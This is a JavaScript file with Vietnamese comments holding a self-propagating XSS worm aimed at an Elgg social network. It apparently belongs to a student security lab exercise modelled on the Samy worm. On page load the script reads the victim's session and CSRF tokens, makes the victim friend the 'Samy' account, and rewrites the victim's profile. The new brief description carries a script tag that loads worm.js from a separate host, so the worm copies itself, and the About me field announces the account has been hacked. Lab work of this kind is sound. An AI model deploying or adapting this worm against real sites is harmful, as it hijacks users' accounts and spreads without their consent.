// ============================================================================
// Self-Propagation XSS Worm (Hosted trên cổng 8000, thực thi trên Web Mạng xã hội cổng 5000)
// ============================================================================

window.onload = function () {
    var MSV = "23001925"; // Thay bằng Mã Sinh Viên của thành viên nhóm
    var samyGuid = 59;      // GUID của tài khoản Samy
    var serverUrl = "http://" + window.location.hostname + ":8000/worm.js";

    var userName = "&name=" + encodeURIComponent(elgg.session.user.name);
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    if (elgg.session.user.guid != samyGuid) {
        // 1. Tự động để nạn nhân kết bạn với tài khoản Samy
        var addFriendUrl = "/action/friends/add?friend=" + samyGuid + ts + token;
        var AjaxFriend = new XMLHttpRequest();
        AjaxFriend.open("GET", addFriendUrl, true);
        AjaxFriend.send();

        // 2 & 3. Sửa Brief Description (tự nhân bản) và About me (đánh dấu bị hack)
        var wormPayload = '<script type="text/javascript" src="' + serverUrl + '"></' + 'script>';
        var aboutMeText = "Tài khoản này đã bị Hack bởi " + MSV;

        var content = token + ts + userName
            + "&description=" + encodeURIComponent(aboutMeText) + "&accesslevel[description]=2"
            + "&briefdescription=" + encodeURIComponent(wormPayload) + "&accesslevel[briefdescription]=2"
            + guid;

        var AjaxProfile = new XMLHttpRequest();
        AjaxProfile.open("POST", "/action/profile/edit", true);
        AjaxProfile.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        AjaxProfile.send(content);
    }
};
